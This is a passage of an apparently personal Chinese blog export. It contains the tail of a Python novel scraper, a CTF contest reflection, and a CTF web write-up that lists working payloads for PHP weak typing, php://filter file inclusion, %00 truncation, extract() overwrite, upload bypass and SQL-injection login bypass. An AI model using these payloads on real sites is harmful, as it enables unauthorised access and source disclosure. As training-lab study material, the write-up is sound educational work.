#所爬书籍有多种结果时，返回所有书籍信息</span><br><span class="line">            self.location = re.findall(r&apos;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href=&apos;,response)</span><br><span class="line">        return self.location</span><br><span class="line"></span><br><span class="line">    def book_info(self):</span><br><span class="line">        res = requests.get(self.location,headers=self.headers).content.decode(&apos;gbk&apos;)</span><br><span class="line">        #正则匹配书名</span><br><span class="line">        self.bookname = re.findall(r&apos;&lt;meta property=&quot;og:title&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res)[0]</span><br><span class="line">        #正则匹配书籍作者</span><br><span class="line">        self.author = re.findall(r&apos;&lt;meta property=&quot;og:novel:author&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res)[0]</span><br><span class="line">        #正则匹配书记简介  re.S指定多行匹配</span><br><span class="line">        self.description = re.findall(r&apos;&lt;meta property=&quot;og:description&quot; content=&quot;(.*?)&quot;/&gt;&apos;,res,re.S)[0].replace(&apos;&amp;nbsp;&apos;,&apos;&apos;).replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;).replace(&apos; &apos;,&apos;&apos;)</span><br><span class="line">        #正则匹配书籍目录</span><br><span class="line">        self.booklink = re.findall(r&apos;class=&quot;leftso png_bg&quot;&gt;&lt;a href=&quot;(.*?)&quot;&apos;,res)[0]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(&apos;gbk&apos;)</span><br><span class="line">        #正则匹配所有章节及其链接</span><br><span class="line">        self.contents = re.findall(r&apos;&lt;li&gt;&lt;a href=&quot;(.*?)&quot; title=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;&lt;/li&gt;&apos;,response)</span><br><span class="line">        #总章数</span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line">    def save(self):</span><br><span class="line">        i = 0</span><br><span class="line"></span><br><span class="line">        #开始写入文件</span><br><span class="line">        with open(&apos;%s.txt&apos;%self.bookname,&apos;w&apos;,encoding=&apos;utf-8&apos;,errors=&apos;ignore&apos;) as text_save:</span><br><span class="line">            text_save.write(self.bookname+&apos;\n作者：&apos;+self.author)</span><br><span class="line">            text_save.write(&apos;\n简介：&apos;+self.description)</span><br><span class="line">            text_save.write(&apos;\n&apos;)</span><br><span class="line">            for num in self.contents:</span><br><span class="line">                #获取单章文本</span><br><span class="line">                text_r = requests.get(num[0],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(&apos;gbk&apos;)</span><br><span class="line">                #获取章节名</span><br><span class="line">                title = num[1].replace(re.findall(r&apos;，共\d*字&apos;,num[1])[0],&apos;&apos;)</span><br><span class="line">                try:</span><br><span class="line">                    #正则匹配内容</span><br><span class="line">                    text = re.findall(r&apos;&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type=&quot;text/javascript&quot;&gt;&apos;,text,re.S)[0]</span><br><span class="line">                except IndexError as e:</span><br><span class="line">                    print(&apos;【**】%s下载失败&apos;%title)</span><br><span class="line">                #数据清洗</span><br><span class="line">                text = text.replace(&apos;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;,&apos;&apos;)</span><br><span class="line">                text = text.replace(&apos;&lt;br /&gt;&apos;,&apos;&apos;)</span><br><span class="line">                text = text.replace(&apos;\r\n\r\n&apos;,&apos;\r\n&apos;)</span><br><span class="line"></span><br><span class="line">                text_save.write(&apos;\n&apos;)</span><br><span class="line">                text_save.write(title)</span><br><span class="line">                text_save.write(&apos;\n\n&apos;)</span><br><span class="line">                text_save.write(text)</span><br><span class="line">                text_save.write(&apos;\n&apos;)</span><br><span class="line">                print(&apos;[*]%-30s\t完成度%.3f%%&apos;%(title,(i+1) * 100 / self.len))</span><br><span class="line">                i += 1</span><br><span class="line">            text_save.write(&apos;\n===全书完===\n==by苏乞儿==\n&apos;)</span><br><span class="line"></span><br><span class="line">    def get_item(self):</span><br><span class="line">        item =  len(self.location)</span><br><span class="line">        return item</span><br><span class="line"></span><br><span class="line">    def set_location(self,location):</span><br><span class="line">        self.location = location</span><br><span class="line"></span><br><span class="line">    def get_bookname(self):</span><br><span class="line">            return self.bookname</span><br><span class="line"></span><br><span class="line">    def get_author(self):</span><br><span class="line">        return self.author</span><br><span class="line"></span><br><span class="line">    #获取总章数</span><br><span class="line">    def get_chapter(self):</span><br><span class="line">        return self.len</span><br><span class="line"></span><br><span class="line">    def get_description(self):</span><br><span class="line">        return self.description</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    book = Bookspider()</span><br><span class="line">    name = input(&apos;[*]请输入书名：&apos;)</span><br><span class="line">    #查书</span><br><span class="line">    locations = book.book_search(name)</span><br><span class="line">    item_sum = book.get_item()</span><br><span class="line">    #以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本</span><br><span class="line">    if item_sum == 1:</span><br><span class="line">        book.set_location(locations[0])</span><br><span class="line">        book.book_info()</span><br><span class="line">        print(&apos;[*]%s共%d条搜索结果：\n&apos;%(name,item_sum))</span><br><span class="line">        print(&apos;#&apos;*150)</span><br><span class="line">        print(&apos;[*]书名：%s&apos;%book.get_bookname())</span><br><span class="line">        print(&apos;[*]作者：%s&apos;%book.get_author())</span><br><span class="line">        print(&apos;[*]简介：%s&apos;%book.get_description())</span><br><span class="line">        print(&apos;#&apos;*150)</span><br><span class="line">        choose1 = input(&apos;[*]是否继续下载？(y/n)&apos;)</span><br><span class="line">        if choose1 == &apos;y&apos; or choose1 == &apos;Y&apos;:</span><br><span class="line">            print(&apos;\n[*]正在下载《%s》&apos;%book.get_bookname())</span><br><span class="line">            #保存文本</span><br><span class="line">            book.save()</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;\n[*]感谢使用！&apos;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        j = 0</span><br><span class="line">        print(&apos;[*]%s共%d条搜索结果：\n&apos;%(name,item_sum))</span><br><span class="line">        for item in locations:</span><br><span class="line">            print(&apos;#&apos;*150)</span><br><span class="line">            print(&apos;[*]序号：%d&apos;%(j+1))</span><br><span class="line">            print(&apos;[*]书名：%s&apos;%item[1])</span><br><span class="line">            print(&apos;[*]作者：%s&apos;%item[2])</span><br><span class="line">            print(&apos;[*]简介：%s&apos;%item[3])</span><br><span class="line">            print(&apos;#&apos;*150)</span><br><span class="line">            j +=1</span><br><span class="line">        choose2 = int(input(&apos;\n\n请选择序号：&apos;))</span><br><span class="line">        if choose2 &gt;= 1 and choose2 &lt;= item_sum:</span><br><span class="line">            print(&apos;\n[*]正在下载《%s》&apos;%locations[choose2-1][1])</span><br><span class="line">            #设置书籍链接地址</span><br><span class="line">            book.set_location(locations[choose2-1][0])</span><br><span class="line">            book.book_info()</span><br><span class="line">            #保存文本</span><br><span class="line">            book.save()</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;\n[*]感谢使用！&apos;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">    print(&apos;\n[*]下载成功！&apos;)</span><br></pre></td></tr></table></figure><h1 id="部分运行截图："><a href="#部分运行截图：" class="headerlink" title="部分运行截图："></a>部分运行截图：</h1><p><img src="/2018/11/07/爬取全书网指定书籍/start.png" alt="开始"></p><p><img src="/2018/11/07/爬取全书网指定书籍/select.png" alt="选择"></p><p><img src="/2018/11/07/爬取全书网指定书籍/ing.png" alt="运行中"></p><h1 id="下载的文本文件："><a href="#下载的文本文件：" class="headerlink" title="下载的文本文件："></a>下载的文本文件：</h1><p><img src="/2018/11/07/爬取全书网指定书籍/wb.png" alt="文本"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一次CTF大赛的感受</title>
      <link href="/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/"/>
      <url>/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/</url>
      
        <content type="html"><![CDATA[<p><strong>经常对过去的成功或不足进行总结，是一件很有逼格的事情。</strong></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。</p><p>先分享一下我比赛最后的排名情况：</p><p><img src="/2018/10/29/记一次CTF大赛的感受/wlkjds_ctf.png" alt="image"></p><p>我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。</p><p>下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场)</p><h1 id="先谈不足"><a href="#先谈不足" class="headerlink" title="先谈不足"></a>先谈不足</h1><ol><li>过分自信，轻视对手</li><li>解题时心静不下来，导致做题时没有深入，往往错过很多会做的题</li><li>没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解</li><li>在网络安全领域坐井观天，没有保持一颗学习的心态</li></ol><h1 id="再说受益"><a href="#再说受益" class="headerlink" title="再说受益"></a>再说受益</h1><ol><li>心中始终坚信：学无止境</li><li>积累了大赛经验，后续参加此类比赛不至于手忙脚乱</li><li>坚守自己的底线</li></ol><h1 id="最后展望"><a href="#最后展望" class="headerlink" title="最后展望"></a>最后展望</h1><p>在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。</p><p><strong>人生没有退路，只有不停地选择！</strong></p><p>–苏乞儿</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 旅行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF的常见write up</title>
      <link href="/2018/10/12/CTF/"/>
      <url>/2018/10/12/CTF/</url>
      
        <content type="html"><![CDATA[<p>本文总结了CTF中我所遇到的题型及其write up，本文长期更新</p><a id="more"></a><p>希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！</p><hr><p>训练场：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南京邮电大学CTF题库</a></p><hr><h1 id="直接查看源码"><a href="#直接查看源码" class="headerlink" title="直接查看源码"></a>直接查看源码</h1><p>出现场景：一般出现在第一题</p><p>write  up： 直接Ctrl+u查看网页源码寻找flag</p><h1 id="修改maxlength"><a href="#修改maxlength" class="headerlink" title="修改maxlength"></a>修改maxlength</h1><p>出现场景：输入框输入内容有位数限制</p><p>write up：F12进入开发者模式修改maxlength后提交</p><h1 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h1><p>各种伪造IP的HTTP头：</p><table><thead><tr><th>序号</th><th>伪造方式</th></tr></thead><tbody><tr><td>1</td><td>X-Forwarded-For</td></tr><tr><td>2</td><td>Client-IP</td></tr><tr><td>3</td><td>x-remote-IP</td></tr><tr><td>4</td><td>x-originating-IP</td></tr><tr><td>5</td><td>x-remote-addr</td></tr></tbody></table><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">       $one = ord(&apos;1&apos;);</span><br><span class="line">       $nine = ord(&apos;9&apos;);</span><br><span class="line">       for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       return false;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          return $number == &apos;54975581388&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$flag=&apos;*******&apos;;</span><br><span class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</span><br><span class="line">   echo $flag;</span><br><span class="line">else </span><br><span class="line">   echo &apos;access denied&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>,因此get方法传值<code>key=0xccccccccc</code></p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h2><p>介绍：PHP在处理哈希字符串时，会利用“!=”或“==”<br>来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0</p><p>出现场景：PHP代码审计、含md5的题</p><p>write  up：</p><p>修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较</p><p>扩展：0e开头MD5值小结</p><table><thead><tr><th>string</th><th>md5()</th></tr></thead><tbody><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><h2 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h2><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])</span><br><span class="line">if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Wrong.&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null）</p><h1 id="脑洞题"><a href="#脑洞题" class="headerlink" title="脑洞题"></a>脑洞题</h1><ol><li>源码找url</li></ol><p><img src="/2018/10/12/CTF/ccdj.png" alt="image"></p><ol start="2"><li>源码看flag</li></ol><p><img src="/2018/10/12/CTF/ccdj1.png" alt="image"></p><h1 id="jjencode-aaencode（颜文字）"><a href="#jjencode-aaencode（颜文字）" class="headerlink" title="jjencode/aaencode（颜文字）"></a>jjencode/aaencode（颜文字）</h1><p>介绍：</p><blockquote><p>什么是jjencode?</p></blockquote><pre><code>将js代码转换成只有符号的字符串</code></pre><blockquote><p>什么是aaencode？</p></blockquote><pre><code>将js代码转换成常用的网络表情</code></pre><p>aaencode加密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。</p><p><img src="/2018/10/12/CTF/AAencode.png" alt="image"></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>典型的文件包含漏洞的格式网址：<code>php?file=xxx.php</code></p><p>原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的</p><p>利用方法：构建<code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。</p><p><img src="/2018/10/12/CTF/wjbh.png" alt="image"></p><p>注意：python3中base64的解密为base64.b64decode()</p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol><li>精度问题</li></ol><p><code>intval()</code>这个函数的作用是把参数自动转换成整数（int）</p><blockquote><p>$id = intval(1024.5)//结果为$id==1024</p></blockquote><h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。</p><h1 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h1><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($_GET[&apos;nctf&apos;])) &#123;</span><br><span class="line">    if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)</span><br><span class="line">        echo &apos;必须输入数字才行&apos;;</span><br><span class="line">    else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        echo &apos;骚年，继续努力吧啊~&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>涉及漏洞：查到资料</p><blockquote><p>1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00</p></blockquote><blockquote><p>2.当ntf为数组时它的返回值不是FALSE</p></blockquote><p>利用方法：</p><blockquote><p>1.?nctf=1%00%23biubiubiu</p></blockquote><blockquote><p>2.?nctf[]=1</p></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    extract($_POST);</span><br><span class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</span><br><span class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表</p><blockquote><p>可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表</p></blockquote><p>由于<code>extract()</code>函数存在变量覆盖漏洞，所以提交post参数：</p><p><code>pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123</code></p><p>即:将两个变量的值修改成相同的，即可得到flag！</p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><h2 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h2><p>绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="正常闭合"><a href="#正常闭合" class="headerlink" title="正常闭合"></a>正常闭合</h3><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br></pre></td></tr></table></figure></p><p>分析：会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code></p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。</p><p>MySQL主要有三种注释方式：</p><table><thead><tr><th>注释方式</th><th>说明</th></tr></thead><tbody><tr><td>#</td><td>注释到行尾</td></tr><tr><td>/*内容*/</td><td>用于行间或多行注释（也可用/**/代替空格）</td></tr><tr><td>–</td><td>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1–    ）</td></tr></tbody></table><p>解法：本题可post：<br><code>user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123</code></p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code></p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有<code>$query[pw]</code>的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。</p><p>例如：<code>select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;</code>这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。</p><p>注意别忘记输入pass后，会对其进行MD5加密。所以构造post：<code>user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir</code>查询语句就变为<code>SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;;</code></p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">#GOAL: login as admin,then get the flag;</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &apos;db.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">function clean($str)&#123;</span><br><span class="line">if(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</span><br><span class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</span><br><span class="line"></span><br><span class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</span><br><span class="line">die(&apos;Invalid password!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p><p>分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造<code>username=suqir\&amp;password=or%201%23</code><br>使得查询语句如下</p><p><code>SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39;</code></p><p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE </span><br><span class="line">name=&apos;suqir\&apos; AND pass=&apos;            『 [name]的值为 [&apos; AND pass=]  ，显然逻辑值为false 』</span><br><span class="line">or 1                                『 但没关系，[false or 1] 的逻辑值为真』 </span><br><span class="line">#&apos;                                  『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line">select * from users where false or 